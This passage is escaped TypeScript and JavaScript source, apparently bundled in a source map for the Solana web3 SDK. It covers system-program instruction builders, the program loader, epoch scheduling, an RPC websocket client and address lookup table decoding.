 Layout.publicKey('base'),\n      Layout.rustString('seed'),\n      Layout.publicKey('programId'),\n    ]),\n  },\n  TransferWithSeed: {\n    index: 11,\n    layout: BufferLayout.struct<SystemInstructionInputData['TransferWithSeed']>(\n      [\n        BufferLayout.u32('instruction'),\n        u64('lamports'),\n        Layout.rustString('seed'),\n        Layout.publicKey('programId'),\n      ],\n    ),\n  },\n  UpgradeNonceAccount: {\n    index: 12,\n    layout: BufferLayout.struct<\n      SystemInstructionInputData['UpgradeNonceAccount']\n    >([BufferLayout.u32('instruction')]),\n  },\n});\n\n/**\n * Factory class for transactions to interact with the System program\n */\nexport class SystemProgram {\n  /**\n   * @internal\n   */\n  constructor() {}\n\n  /**\n   * Public key that identifies the System program\n   */\n  static programId: PublicKey = new PublicKey(\n    '11111111111111111111111111111111',\n  );\n\n  /**\n   * Generate a transaction instruction that creates a new account\n   */\n  static createAccount(params: CreateAccountParams): TransactionInstruction {\n    const type = SYSTEM_INSTRUCTION_LAYOUTS.Create;\n    const data = encodeData(type, {\n      lamports: params.lamports,\n      space: params.space,\n      programId: toBuffer(params.programId.toBuffer()),\n    });\n\n    return new TransactionInstruction({\n      keys: [\n        {pubkey: params.fromPubkey, isSigner: true, isWritable: true},\n        {pubkey: params.newAccountPubkey, isSigner: true, isWritable: true},\n      ],\n      programId: this.programId,\n      data,\n    });\n  }\n\n  /**\n   * Generate a transaction instruction that transfers lamports from one account to another\n   */\n  static transfer(\n    params: TransferParams | TransferWithSeedParams,\n  ): TransactionInstruction {\n    let data;\n    let keys;\n    if ('basePubkey' in params) {\n      const type = SYSTEM_INSTRUCTION_LAYOUTS.TransferWithSeed;\n      data = encodeData(type, {\n        lamports: BigInt(params.lamports),\n        seed: params.seed,\n        programId: toBuffer(params.programId.toBuffer()),\n      });\n      keys = [\n        {pubkey: params.fromPubkey, isSigner: false, isWritable: true},\n        {pubkey: params.basePubkey, isSigner: true, isWritable: false},\n        {pubkey: params.toPubkey, isSigner: false, isWritable: true},\n      ];\n    } else {\n      const type = SYSTEM_INSTRUCTION_LAYOUTS.Transfer;\n      data = encodeData(type, {lamports: BigInt(params.lamports)});\n      keys = [\n        {pubkey: params.fromPubkey, isSigner: true, isWritable: true},\n        {pubkey: params.toPubkey, isSigner: false, isWritable: true},\n      ];\n    }\n\n    return new TransactionInstruction({\n      keys,\n      programId: this.programId,\n      data,\n    });\n  }\n\n  /**\n   * Generate a transaction instruction that assigns an account to a program\n   */\n  static assign(\n    params: AssignParams | AssignWithSeedParams,\n  ): TransactionInstruction {\n    let data;\n    let keys;\n    if ('basePubkey' in params) {\n      const type = SYSTEM_INSTRUCTION_LAYOUTS.AssignWithSeed;\n      data = encodeData(type, {\n        base: toBuffer(params.basePubkey.toBuffer()),\n        seed: params.seed,\n        programId: toBuffer(params.programId.toBuffer()),\n      });\n      keys = [\n        {pubkey: params.accountPubkey, isSigner: false, isWritable: true},\n        {pubkey: params.basePubkey, isSigner: true, isWritable: false},\n      ];\n    } else {\n      const type = SYSTEM_INSTRUCTION_LAYOUTS.Assign;\n      data = encodeData(type, {\n        programId: toBuffer(params.programId.toBuffer()),\n      });\n      keys = [{pubkey: params.accountPubkey, isSigner: true, isWritable: true}];\n    }\n\n    return new TransactionInstruction({\n      keys,\n      programId: this.programId,\n      data,\n    });\n  }\n\n  /**\n   * Generate a transaction instruction that creates a new account at\n   *   an address generated with `from`, a seed, and programId\n   */\n  static createAccountWithSeed(\n    params: CreateAccountWithSeedParams,\n  ): TransactionInstruction {\n    const type = SYSTEM_INSTRUCTION_LAYOUTS.CreateWithSeed;\n    const data = encodeData(type, {\n      base: toBuffer(params.basePubkey.toBuffer()),\n      seed: params.seed,\n      lamports: params.lamports,\n      space: params.space,\n      programId: toBuffer(params.programId.toBuffer()),\n    });\n    let keys = [\n      {pubkey: params.fromPubkey, isSigner: true, isWritable: true},\n      {pubkey: params.newAccountPubkey, isSigner: false, isWritable: true},\n    ];\n    if (!params.basePubkey.equals(params.fromPubkey)) {\n      keys.push({\n        pubkey: params.basePubkey,\n        isSigner: true,\n        isWritable: false,\n      });\n    }\n\n    return new TransactionInstruction({\n      keys,\n      programId: this.programId,\n      data,\n    });\n  }\n\n  /**\n   * Generate a transaction that creates a new Nonce account\n   */\n  static createNonceAccount(\n    params: CreateNonceAccountParams | CreateNonceAccountWithSeedParams,\n  ): Transaction {\n    const transaction = new Transaction();\n    if ('basePubkey' in params && 'seed' in params) {\n      transaction.add(\n        SystemProgram.createAccountWithSeed({\n          fromPubkey: params.fromPubkey,\n          newAccountPubkey: params.noncePubkey,\n          basePubkey: params.basePubkey,\n          seed: params.seed,\n          lamports: params.lamports,\n          space: NONCE_ACCOUNT_LENGTH,\n          programId: this.programId,\n        }),\n      );\n    } else {\n      transaction.add(\n        SystemProgram.createAccount({\n          fromPubkey: params.fromPubkey,\n          newAccountPubkey: params.noncePubkey,\n          lamports: params.lamports,\n          space: NONCE_ACCOUNT_LENGTH,\n          programId: this.programId,\n        }),\n      );\n    }\n\n    const initParams = {\n      noncePubkey: params.noncePubkey,\n      authorizedPubkey: params.authorizedPubkey,\n    };\n\n    transaction.add(this.nonceInitialize(initParams));\n    return transaction;\n  }\n\n  /**\n   * Generate an instruction to initialize a Nonce account\n   */\n  static nonceInitialize(\n    params: InitializeNonceParams,\n  ): TransactionInstruction {\n    const type = SYSTEM_INSTRUCTION_LAYOUTS.InitializeNonceAccount;\n    const data = encodeData(type, {\n      authorized: toBuffer(params.authorizedPubkey.toBuffer()),\n    });\n    const instructionData = {\n      keys: [\n        {pubkey: params.noncePubkey, isSigner: false, isWritable: true},\n        {\n          pubkey: SYSVAR_RECENT_BLOCKHASHES_PUBKEY,\n          isSigner: false,\n          isWritable: false,\n        },\n        {pubkey: SYSVAR_RENT_PUBKEY, isSigner: false, isWritable: false},\n      ],\n      programId: this.programId,\n      data,\n    };\n    return new TransactionInstruction(instructionData);\n  }\n\n  /**\n   * Generate an instruction to advance the nonce in a Nonce account\n   */\n  static nonceAdvance(params: AdvanceNonceParams): TransactionInstruction {\n    const type = SYSTEM_INSTRUCTION_LAYOUTS.AdvanceNonceAccount;\n    const data = encodeData(type);\n    const instructionData = {\n      keys: [\n        {pubkey: params.noncePubkey, isSigner: false, isWritable: true},\n        {\n          pubkey: SYSVAR_RECENT_BLOCKHASHES_PUBKEY,\n          isSigner: false,\n          isWritable: false,\n        },\n        {pubkey: params.authorizedPubkey, isSigner: true, isWritable: false},\n      ],\n      programId: this.programId,\n      data,\n    };\n    return new TransactionInstruction(instructionData);\n  }\n\n  /**\n   * Generate a transaction instruction that withdraws lamports from a Nonce account\n   */\n  static nonceWithdraw(params: WithdrawNonceParams): TransactionInstruction {\n    const type = SYSTEM_INSTRUCTION_LAYOUTS.WithdrawNonceAccount;\n    const data = encodeData(type, {lamports: params.lamports});\n\n    return new TransactionInstruction({\n      keys: [\n        {pubkey: params.noncePubkey, isSigner: false, isWritable: true},\n        {pubkey: params.toPubkey, isSigner: false, isWritable: true},\n        {\n          pubkey: SYSVAR_RECENT_BLOCKHASHES_PUBKEY,\n          isSigner: false,\n          isWritable: false,\n        },\n        {\n          pubkey: SYSVAR_RENT_PUBKEY,\n          isSigner: false,\n          isWritable: false,\n        },\n        {pubkey: params.authorizedPubkey, isSigner: true, isWritable: false},\n      ],\n      programId: this.programId,\n      data,\n    });\n  }\n\n  /**\n   * Generate a transaction instruction that authorizes a new PublicKey as the authority\n   * on a Nonce account.\n   */\n  static nonceAuthorize(params: AuthorizeNonceParams): TransactionInstruction {\n    const type = SYSTEM_INSTRUCTION_LAYOUTS.AuthorizeNonceAccount;\n    const data = encodeData(type, {\n      authorized: toBuffer(params.newAuthorizedPubkey.toBuffer()),\n    });\n\n    return new TransactionInstruction({\n      keys: [\n        {pubkey: params.noncePubkey, isSigner: false, isWritable: true},\n        {pubkey: params.authorizedPubkey, isSigner: true, isWritable: false},\n      ],\n      programId: this.programId,\n      data,\n    });\n  }\n\n  /**\n   * Generate a transaction instruction that allocates space in an account without funding\n   */\n  static allocate(\n    params: AllocateParams | AllocateWithSeedParams,\n  ): TransactionInstruction {\n    let data;\n    let keys;\n    if ('basePubkey' in params) {\n      const type = SYSTEM_INSTRUCTION_LAYOUTS.AllocateWithSeed;\n      data = encodeData(type, {\n        base: toBuffer(params.basePubkey.toBuffer()),\n        seed: params.seed,\n        space: params.space,\n        programId: toBuffer(params.programId.toBuffer()),\n      });\n      keys = [\n        {pubkey: params.accountPubkey, isSigner: false, isWritable: true},\n        {pubkey: params.basePubkey, isSigner: true, isWritable: false},\n      ];\n    } else {\n      const type = SYSTEM_INSTRUCTION_LAYOUTS.Allocate;\n      data = encodeData(type, {\n        space: params.space,\n      });\n      keys = [{pubkey: params.accountPubkey, isSigner: true, isWritable: true}];\n    }\n\n    return new TransactionInstruction({\n      keys,\n      programId: this.programId,\n      data,\n    });\n  }\n}\n","import {Buffer} from 'buffer';\nimport * as BufferLayout from '@solana/buffer-layout';\n\nimport {PublicKey} from './publickey';\nimport {Transaction, PACKET_DATA_SIZE} from './transaction';\nimport {MS_PER_SLOT} from './timing';\nimport {SYSVAR_RENT_PUBKEY} from './sysvar';\nimport {sendAndConfirmTransaction} from './utils/send-and-confirm-transaction';\nimport {sleep} from './utils/sleep';\nimport type {Connection} from './connection';\nimport type {Signer} from './keypair';\nimport {SystemProgram} from './programs/system';\nimport {IInstructionInputData} from './instruction';\n\n// Keep program chunks under PACKET_DATA_SIZE, leaving enough room for the\n// rest of the Transaction fields\n//\n// TODO: replace 300 with a proper constant for the size of the other\n// Transaction fields\nconst CHUNK_SIZE = PACKET_DATA_SIZE - 300;\n\n/**\n * Program loader interface\n */\nexport class Loader {\n  /**\n   * @internal\n   */\n  constructor() {}\n\n  /**\n   * Amount of program data placed in each load Transaction\n   */\n  static chunkSize: number = CHUNK_SIZE;\n\n  /**\n   * Minimum number of signatures required to load a program not including\n   * retries\n   *\n   * Can be used to calculate transaction fees\n   */\n  static getMinNumSignatures(dataLength: number): number {\n    return (\n      2 * // Every transaction requires two signatures (payer + program)\n      (Math.ceil(dataLength / Loader.chunkSize) +\n        1 + // Add one for Create transaction\n        1) // Add one for Finalize transaction\n    );\n  }\n\n  /**\n   * Loads a generic program\n   *\n   * @param connection The connection to use\n   * @param payer System account that pays to load the program\n   * @param program Account to load the program into\n   * @param programId Public key that identifies the loader\n   * @param data Program octets\n   * @return true if program was loaded successfully, false if program was already loaded\n   */\n  static async load(\n    connection: Connection,\n    payer: Signer,\n    program: Signer,\n    programId: PublicKey,\n    data: Buffer | Uint8Array | Array<number>,\n  ): Promise<boolean> {\n    {\n      const balanceNeeded = await connection.getMinimumBalanceForRentExemption(\n        data.length,\n      );\n\n      // Fetch program account info to check if it has already been created\n      const programInfo = await connection.getAccountInfo(\n        program.publicKey,\n        'confirmed',\n      );\n\n      let transaction: Transaction | null = null;\n      if (programInfo !== null) {\n        if (programInfo.executable) {\n          console.error('Program load failed, account is already executable');\n          return false;\n        }\n\n        if (programInfo.data.length !== data.length) {\n          transaction = transaction || new Transaction();\n          transaction.add(\n            SystemProgram.allocate({\n              accountPubkey: program.publicKey,\n              space: data.length,\n            }),\n          );\n        }\n\n        if (!programInfo.owner.equals(programId)) {\n          transaction = transaction || new Transaction();\n          transaction.add(\n            SystemProgram.assign({\n              accountPubkey: program.publicKey,\n              programId,\n            }),\n          );\n        }\n\n        if (programInfo.lamports < balanceNeeded) {\n          transaction = transaction || new Transaction();\n          transaction.add(\n            SystemProgram.transfer({\n              fromPubkey: payer.publicKey,\n              toPubkey: program.publicKey,\n              lamports: balanceNeeded - programInfo.lamports,\n            }),\n          );\n        }\n      } else {\n        transaction = new Transaction().add(\n          SystemProgram.createAccount({\n            fromPubkey: payer.publicKey,\n            newAccountPubkey: program.publicKey,\n            lamports: balanceNeeded > 0 ? balanceNeeded : 1,\n            space: data.length,\n            programId,\n          }),\n        );\n      }\n\n      // If the account is already created correctly, skip this step\n      // and proceed directly to loading instructions\n      if (transaction !== null) {\n        await sendAndConfirmTransaction(\n          connection,\n          transaction,\n          [payer, program],\n          {\n            commitment: 'confirmed',\n          },\n        );\n      }\n    }\n\n    const dataLayout = BufferLayout.struct<\n      Readonly<{\n        bytes: number[];\n        bytesLength: number;\n        bytesLengthPadding: number;\n        instruction: number;\n        offset: number;\n      }>\n    >([\n      BufferLayout.u32('instruction'),\n      BufferLayout.u32('offset'),\n      BufferLayout.u32('bytesLength'),\n      BufferLayout.u32('bytesLengthPadding'),\n      BufferLayout.seq(\n        BufferLayout.u8('byte'),\n        BufferLayout.offset(BufferLayout.u32(), -8),\n        'bytes',\n      ),\n    ]);\n\n    const chunkSize = Loader.chunkSize;\n    let offset = 0;\n    let array = data;\n    let transactions = [];\n    while (array.length > 0) {\n      const bytes = array.slice(0, chunkSize);\n      const data = Buffer.alloc(chunkSize + 16);\n      dataLayout.encode(\n        {\n          instruction: 0, // Load instruction\n          offset,\n          bytes: bytes as number[],\n          bytesLength: 0,\n          bytesLengthPadding: 0,\n        },\n        data,\n      );\n\n      const transaction = new Transaction().add({\n        keys: [{pubkey: program.publicKey, isSigner: true, isWritable: true}],\n        programId,\n        data,\n      });\n      transactions.push(\n        sendAndConfirmTransaction(connection, transaction, [payer, program], {\n          commitment: 'confirmed',\n        }),\n      );\n\n      // Delay between sends in an attempt to reduce rate limit errors\n      if (connection._rpcEndpoint.includes('solana.com')) {\n        const REQUESTS_PER_SECOND = 4;\n        await sleep(1000 / REQUESTS_PER_SECOND);\n      }\n\n      offset += chunkSize;\n      array = array.slice(chunkSize);\n    }\n    await Promise.all(transactions);\n\n    // Finalize the account loaded with program data for execution\n    {\n      const dataLayout = BufferLayout.struct<IInstructionInputData>([\n        BufferLayout.u32('instruction'),\n      ]);\n\n      const data = Buffer.alloc(dataLayout.span);\n      dataLayout.encode(\n        {\n          instruction: 1, // Finalize instruction\n        },\n        data,\n      );\n\n      const transaction = new Transaction().add({\n        keys: [\n          {pubkey: program.publicKey, isSigner: true, isWritable: true},\n          {pubkey: SYSVAR_RENT_PUBKEY, isSigner: false, isWritable: false},\n        ],\n        programId,\n        data,\n      });\n      const deployCommitment = 'processed';\n      const finalizeSignature = await connection.sendTransaction(\n        transaction,\n        [payer, program],\n        {preflightCommitment: deployCommitment},\n      );\n      const {context, value} = await connection.confirmTransaction(\n        {\n          signature: finalizeSignature,\n          lastValidBlockHeight: transaction.lastValidBlockHeight!,\n          blockhash: transaction.recentBlockhash!,\n        },\n        deployCommitment,\n      );\n      if (value.err) {\n        throw new Error(\n          `Transaction ${finalizeSignature} failed (${JSON.stringify(value)})`,\n        );\n      }\n      // We prevent programs from being usable until the slot after their deployment.\n      // See https://github.com/solana-labs/solana/pull/29654\n      while (\n        true // eslint-disable-line no-constant-condition\n      ) {\n        try {\n          const currentSlot = await connection.getSlot({\n            commitment: deployCommitment,\n          });\n          if (currentSlot > context.slot) {\n            break;\n          }\n        } catch {\n          /* empty */\n        }\n        await new Promise(resolve =>\n          setTimeout(resolve, Math.round(MS_PER_SLOT / 2)),\n        );\n      }\n    }\n\n    // success\n    return true;\n  }\n}\n","import type {Buffer} from 'buffer';\n\nimport {PublicKey} from './publickey';\nimport {Loader} from './loader';\nimport type {Connection} from './connection';\nimport type {Signer} from './keypair';\n\n/**\n * @deprecated Deprecated since Solana v1.17.20.\n */\nexport const BPF_LOADER_PROGRAM_ID = new PublicKey(\n  'BPFLoader2111111111111111111111111111111111',\n);\n\n/**\n * Factory class for transactions to interact with a program loader\n *\n * @deprecated Deprecated since Solana v1.17.20.\n */\nexport class BpfLoader {\n  /**\n   * Minimum number of signatures required to load a program not including\n   * retries\n   *\n   * Can be used to calculate transaction fees\n   */\n  static getMinNumSignatures(dataLength: number): number {\n    return Loader.getMinNumSignatures(dataLength);\n  }\n\n  /**\n   * Load a SBF program\n   *\n   * @param connection The connection to use\n   * @param payer Account that will pay program loading fees\n   * @param program Account to load the program into\n   * @param elf The entire ELF containing the SBF program\n   * @param loaderProgramId The program id of the BPF loader to use\n   * @return true if program was loaded successfully, false if program was already loaded\n   */\n  static load(\n    connection: Connection,\n    payer: Signer,\n    program: Signer,\n    elf: Buffer | Uint8Array | Array<number>,\n    loaderProgramId: PublicKey,\n  ): Promise<boolean> {\n    return Loader.load(connection, payer, program, loaderProgramId, elf);\n  }\n}\n","var objToString = Object.prototype.toString;\nvar objKeys = Object.keys || function(obj) {\n\t\tvar keys = [];\n\t\tfor (var name in obj) {\n\t\t\tkeys.push(name);\n\t\t}\n\t\treturn keys;\n\t};\n\nfunction stringify(val, isArrayProp) {\n\tvar i, max, str, keys, key, propVal, toStr;\n\tif (val === true) {\n\t\treturn \"true\";\n\t}\n\tif (val === false) {\n\t\treturn \"false\";\n\t}\n\tswitch (typeof val) {\n\t\tcase \"object\":\n\t\t\tif (val === null) {\n\t\t\t\treturn null;\n\t\t\t} else if (val.toJSON && typeof val.toJSON === \"function\") {\n\t\t\t\treturn stringify(val.toJSON(), isArrayProp);\n\t\t\t} else {\n\t\t\t\ttoStr = objToString.call(val);\n\t\t\t\tif (toStr === \"[object Array]\") {\n\t\t\t\t\tstr = '[';\n\t\t\t\t\tmax = val.length - 1;\n\t\t\t\t\tfor(i = 0; i < max; i++) {\n\t\t\t\t\t\tstr += stringify(val[i], true) + ',';\n\t\t\t\t\t}\n\t\t\t\t\tif (max > -1) {\n\t\t\t\t\t\tstr += stringify(val[i], true);\n\t\t\t\t\t}\n\t\t\t\t\treturn str + ']';\n\t\t\t\t} else if (toStr === \"[object Object]\") {\n\t\t\t\t\t// only object is left\n\t\t\t\t\tkeys = objKeys(val).sort();\n\t\t\t\t\tmax = keys.length;\n\t\t\t\t\tstr = \"\";\n\t\t\t\t\ti = 0;\n\t\t\t\t\twhile (i < max) {\n\t\t\t\t\t\tkey = keys[i];\n\t\t\t\t\t\tpropVal = stringify(val[key], false);\n\t\t\t\t\t\tif (propVal !== undefined) {\n\t\t\t\t\t\t\tif (str) {\n\t\t\t\t\t\t\t\tstr += ',';\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tstr += JSON.stringify(key) + ':' + propVal;\n\t\t\t\t\t\t}\n\t\t\t\t\t\ti++;\n\t\t\t\t\t}\n\t\t\t\t\treturn '{' + str + '}';\n\t\t\t\t} else {\n\t\t\t\t\treturn JSON.stringify(val);\n\t\t\t\t}\n\t\t\t}\n\t\tcase \"function\":\n\t\tcase \"undefined\":\n\t\t\treturn isArrayProp ? null : undefined;\n\t\tcase \"string\":\n\t\t\treturn JSON.stringify(val);\n\t\tdefault:\n\t\t\treturn isFinite(val) ? val : null;\n\t}\n}\n\nmodule.exports = function(val) {\n\tvar returnVal = stringify(val, false);\n\tif (returnVal !== undefined) {\n\t\treturn ''+ returnVal;\n\t}\n};\n","const MINIMUM_SLOT_PER_EPOCH = 32;\n\n// Returns the number of trailing zeros in the binary representation of self.\nfunction trailingZeros(n: number) {\n  let trailingZeros = 0;\n  while (n > 1) {\n    n /= 2;\n    trailingZeros++;\n  }\n  return trailingZeros;\n}\n\n// Returns the smallest power of two greater than or equal to n\nfunction nextPowerOfTwo(n: number) {\n  if (n === 0) return 1;\n  n--;\n  n |= n >> 1;\n  n |= n >> 2;\n  n |= n >> 4;\n  n |= n >> 8;\n  n |= n >> 16;\n  n |= n >> 32;\n  return n + 1;\n}\n\n/**\n * Epoch schedule\n * (see https://docs.solana.com/terminology#epoch)\n * Can be retrieved with the {@link Connection.getEpochSchedule} method\n */\nexport class EpochSchedule {\n  /** The maximum number of slots in each epoch */\n  public slotsPerEpoch: number;\n  /** The number of slots before beginning of an epoch to calculate a leader schedule for that epoch */\n  public leaderScheduleSlotOffset: number;\n  /** Indicates whether epochs start short and grow */\n  public warmup: boolean;\n  /** The first epoch with `slotsPerEpoch` slots */\n  public firstNormalEpoch: number;\n  /** The first slot of `firstNormalEpoch` */\n  public firstNormalSlot: number;\n\n  constructor(\n    slotsPerEpoch: number,\n    leaderScheduleSlotOffset: number,\n    warmup: boolean,\n    firstNormalEpoch: number,\n    firstNormalSlot: number,\n  ) {\n    this.slotsPerEpoch = slotsPerEpoch;\n    this.leaderScheduleSlotOffset = leaderScheduleSlotOffset;\n    this.warmup = warmup;\n    this.firstNormalEpoch = firstNormalEpoch;\n    this.firstNormalSlot = firstNormalSlot;\n  }\n\n  getEpoch(slot: number): number {\n    return this.getEpochAndSlotIndex(slot)[0];\n  }\n\n  getEpochAndSlotIndex(slot: number): [number, number] {\n    if (slot < this.firstNormalSlot) {\n      const epoch =\n        trailingZeros(nextPowerOfTwo(slot + MINIMUM_SLOT_PER_EPOCH + 1)) -\n        trailingZeros(MINIMUM_SLOT_PER_EPOCH) -\n        1;\n\n      const epochLen = this.getSlotsInEpoch(epoch);\n      const slotIndex = slot - (epochLen - MINIMUM_SLOT_PER_EPOCH);\n      return [epoch, slotIndex];\n    } else {\n      const normalSlotIndex = slot - this.firstNormalSlot;\n      const normalEpochIndex = Math.floor(normalSlotIndex / this.slotsPerEpoch);\n      const epoch = this.firstNormalEpoch + normalEpochIndex;\n      const slotIndex = normalSlotIndex % this.slotsPerEpoch;\n      return [epoch, slotIndex];\n    }\n  }\n\n  getFirstSlotInEpoch(epoch: number): number {\n    if (epoch <= this.firstNormalEpoch) {\n      return (Math.pow(2, epoch) - 1) * MINIMUM_SLOT_PER_EPOCH;\n    } else {\n      return (\n        (epoch - this.firstNormalEpoch) * this.slotsPerEpoch +\n        this.firstNormalSlot\n      );\n    }\n  }\n\n  getLastSlotInEpoch(epoch: number): number {\n    return this.getFirstSlotInEpoch(epoch) + this.getSlotsInEpoch(epoch) - 1;\n  }\n\n  getSlotsInEpoch(epoch: number) {\n    if (epoch < this.firstNormalEpoch) {\n      return Math.pow(2, epoch + trailingZeros(MINIMUM_SLOT_PER_EPOCH));\n    } else {\n      return this.slotsPerEpoch;\n    }\n  }\n}\n","export const Headers: typeof globalThis.Headers = globalThis.Headers;\nexport const Request: typeof globalThis.Request = globalThis.Request;\nexport const Response: typeof globalThis.Response = globalThis.Response;\nexport default globalThis.fetch;\n","import {\n  CommonClient,\n  ICommonWebSocket,\n  IWSClientAdditionalOptions,\n  NodeWebSocketType,\n  NodeWebSocketTypeOptions,\n  WebSocket as createRpc,\n} from 'rpc-websockets';\n\ninterface IHasReadyState {\n  readyState: WebSocket['readyState'];\n}\n\nexport default class RpcWebSocketClient extends CommonClient {\n  private underlyingSocket: IHasReadyState | undefined;\n  constructor(\n    address?: string,\n    options?: IWSClientAdditionalOptions & NodeWebSocketTypeOptions,\n    generate_request_id?: (\n      method: string,\n      params: object | Array<any>,\n    ) => number,\n  ) {\n    const webSocketFactory = (url: string) => {\n      const rpc = createRpc(url, {\n        autoconnect: true,\n        max_reconnects: 5,\n        reconnect: true,\n        reconnect_interval: 1000,\n        ...options,\n      });\n      if ('socket' in rpc) {\n        this.underlyingSocket = rpc.socket as ReturnType<typeof createRpc>;\n      } else {\n        this.underlyingSocket = rpc as NodeWebSocketType;\n      }\n      return rpc as ICommonWebSocket;\n    };\n    super(webSocketFactory, address, options, generate_request_id);\n  }\n  call(\n    ...args: Parameters<CommonClient['call']>\n  ): ReturnType<CommonClient['call']> {\n    const readyState = this.underlyingSocket?.readyState;\n    if (readyState === 1 /* WebSocket.OPEN */) {\n      return super.call(...args);\n    }\n    return Promise.reject(\n      new Error(\n        'Tried to call a JSON-RPC method `' +\n          args[0] +\n          '` but the socket was not `CONNECTING` or `OPEN` (`readyState` was ' +\n          readyState +\n          ')',\n      ),\n    );\n  }\n  notify(\n    ...args: Parameters<CommonClient['notify']>\n  ): ReturnType<CommonClient['notify']> {\n    const readyState = this.underlyingSocket?.readyState;\n    if (readyState === 1 /* WebSocket.OPEN */) {\n      return super.notify(...args);\n    }\n    return Promise.reject(\n      new Error(\n        'Tried to send a JSON-RPC notification `' +\n          args[0] +\n          '` but the socket was not `CONNECTING` or `OPEN` (`readyState` was ' +\n          readyState +\n          ')',\n      ),\n    );\n  }\n}\n","import * as BufferLayout from '@solana/buffer-layout';\n\nexport interface IAccountStateData {\n  readonly typeIndex: number;\n}\n\n/**\n * @internal\n */\nexport type AccountType<TInputData extends IAccountStateData> = {\n  /** The account type index (from solana upstream program) */\n  index: number;\n  /** The BufferLayout to use to build data */\n  layout: BufferLayout.Layout<TInputData>;\n};\n\n/**\n * Decode account data buffer using an AccountType\n * @internal\n */\nexport function decodeData<TAccountStateData extends IAccountStateData>(\n  type: AccountType<TAccountStateData>,\n  data: Uint8Array,\n): TAccountStateData {\n  let decoded: TAccountStateData;\n  try {\n    decoded = type.layout.decode(data);\n  } catch (err) {\n    throw new Error('invalid instruction; ' + err);\n  }\n\n  if (decoded.typeIndex !== type.index) {\n    throw new Error(\n      `invalid account data; account type mismatch ${decoded.typeIndex} != ${type.index}`,\n    );\n  }\n\n  return decoded;\n}\n","import * as BufferLayout from '@solana/buffer-layout';\n\nimport assert from '../../utils/assert';\nimport * as Layout from '../../layout';\nimport {PublicKey} from '../../publickey';\nimport {u64} from '../../utils/bigint';\nimport {decodeData} from '../../account-data';\n\nexport type AddressLookupTableState = {\n  deactivationSlot: bigint;\n  lastExtendedSlot: number;\n  lastExtendedSlotStartIndex: number;\n  authority?: PublicKey;\n  addresses: Array<PublicKey>;\n};\n\nexport type AddressLookupTableAccountArgs = {\n  key: PublicKey;\n  state: AddressLookupTableState;\n};\n\n/// The serialized size of lookup table metadata\nconst LOOKUP_TABLE_META_SIZE = 56;\n\nexport class AddressLookupTableAccount {\n  key: PublicKey;\n  state: AddressLookupTableState;\n\n  constructor(args: AddressLookupTableAccountArgs) {\n    this.key = args.key;\n    this.state = args.state;\n  }\n\n  isActive(): boolean {\n    const U64_MAX = BigInt('0xffffffffffffffff');\n    return this.state.deactivationSlot === U64_MAX;\n  }\n\n  static deserialize(accountData: Uint8Array): AddressLookupTableState {\n    const meta = decodeData(LookupTableMetaLayout, accountData);\n\n    const serializedAddressesLen = accountData.length - LOOKUP_TABLE_META_SIZE;\n    assert(serializedAddressesLen >= 0, 'lookup table is invalid');\n    assert(serializedAddressesLen % 32 === 0, 'lookup table is invalid');\n\n    const numSerializedAddresses = serializedAddressesLen / 32;\n    const {addresses} = BufferLayout.struct<{addresses: Array<Uint8Array>}>([\n      BufferLayout.seq(Layout.publicKey(), numSerializedAddresses, 'addresses'),\n    ]).decode(accountData.slice(LOOKUP_TABLE_META_SIZE));\n\n    return {\n      deactivationSlot: meta.deactivationSlot,\n      lastExtendedSlot: meta.lastExtendedSlot,\n      lastExtendedSlotStartIndex: meta.lastExtendedStartIndex,\n      authority:\n        meta.authority.length !== 0\n          ? new PublicKey(meta.authority[0])\n          : undefined,\n      addresses: addresses.map(address => new PublicKey(address)),\n    };\n  }\n}\n\nconst LookupTableMetaLayout = {\n  index: 1,\n  layout: BufferLayout.struct<{\n    typeIndex: number;\n    deactivationSlot: bigint;\n    lastExtendedSlot: number;\n    lastExtendedStartIndex: number;\n    authority: Array<Uint8Array>;\n  }>([\n    BufferLayout.u32('typeIndex'),\n    u64('deactivationSlot'),\n    BufferLayout.nu64('lastExtendedSlot'),\n    BufferLayout.u8('lastExtendedStartIndex'),\n    BufferLayout.u8(), // option\n    BufferLayout.seq(\n      Layout.publicKey(),\n      BufferLayout.offset(BufferLayout.u8(), -1),\n      'authority',\n    ),\n  ]),\n};\n","const URL_RE = /^[^:]+:\\/\\/([^:[]+|\\[[^\\]]+\\])(:\\d+)?(.*)/i;\n\nexport function makeWebsocketUrl(endpoint: string) {\n  const matches = endpoint.match(URL_RE);\n  if (matches == null) {\n    throw TypeError(`Failed to validate endpoint URL \\`${endpoint}\\``);\n  }\n  const [\n    _, // eslint-disable-line @typescript-eslint/no-unused-vars\n    hostish,\n    portWithColon,\n    rest,\n  ] = matches;\n  const protocol = endpoint.startsWith('https:') ? 'wss:' : 'ws:';\n  const startPort =\n    portWithColon == null ? null : parseInt(portWithColon.slice(1), 10);\n  const websocketPort =\n    // Only shift the port by +1 as a convention for ws(s) only if given endpoint\n    // is explicitly specifying the endpoint port (HTTP-based RPC), assuming\n    // we're directly trying to connect to agave-validator's ws listening port.\n    // When the endpoint omits the port, we're connecting to the protocol\n    // default ports: http(80) or https(443) and it's assumed we're behind a reverse\n    // proxy which manages WebSocket upgrade and backend port redirection.\n    startPort == null ? '' : `:${startPort + 1}`;\n  return `${protocol}//${hostish}${websocketPort}${rest}`;\n}\n","import HttpKeepAliveAgent, {\n  HttpsAgent as HttpsKeepAliveAgent,\n} from 'agentkeepalive';\nimport bs58 from 'bs58';\nimport {Buffer} from 'buffer';\n// @ts-ignore\nimport fastStableStringify from 'fast-stable-stringify';\nimport type {Agent as NodeHttpAgent} from 'http';\nimport {Agent as NodeHttpsAgent} from 'https';\nimport {\n  type as pick,\n  number,\n  string,\n  array,\n  boolean,\n  literal,\n  record,\n  union,\n  optional,\n  nullable,\n  coerce,\n  instance,\n  create,\n  tuple,\n  unknown,\n  any,\n} from 'superstruct';\nimport type {Struct} from 'superstruct';\nimport RpcClient from 'jayson/lib/client/browser';\nimport {JSONRPCError} from 'jayson';\n\nimport {EpochSchedule} from './epoch-schedule';\nimport {SendTransactionError, SolanaJSONRPCError} from './errors';\nimport fetchImpl from './fetch-impl';\nimport {DurableNonce, NonceAccount} from './nonce-account';\nimport {PublicKey} from './publickey';\nimport {Signer} from './keypair';\nimport RpcWebSocketClient from './rpc-websocket';\nimport {MS_PER_SLOT} from './timing';\nimport {\n  Transaction,\n  TransactionStatus,\n  TransactionVersion,\n  VersionedTransaction,\n} from './transaction';\nimport {Message, MessageHeader, MessageV0, VersionedMessage} from './message';\nimport {AddressLookupTableAccount} from 